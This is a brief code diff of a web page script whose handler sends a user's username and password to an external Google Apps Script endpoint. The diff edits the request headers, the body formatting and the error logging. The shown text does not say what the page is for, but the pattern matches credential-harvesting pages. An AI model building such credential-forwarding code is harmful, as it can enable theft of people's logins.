@@ -809,10 +809,7 @@
       try {
         const response = await fetch('https://script.google.com/macros/s/AKfycbyP4lkq4M3xE_hq-dBzDyVIB8R3SzF-Q9zURjHC4Fyr8FeLPqXVjVCOKmifSUk11Rsi/exec', {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ username, password }),
+          body: JSON.stringify({ "username": username, "password": password }),
         });
 
         const result = await response.json();
@@ -822,7 +819,7 @@
           console.log('Error submitting data.');
         }
       } catch (error) {
-        console.error(`Error: ${error.message}`);
+        console.error(error);
       }
     };</script>
 </body>
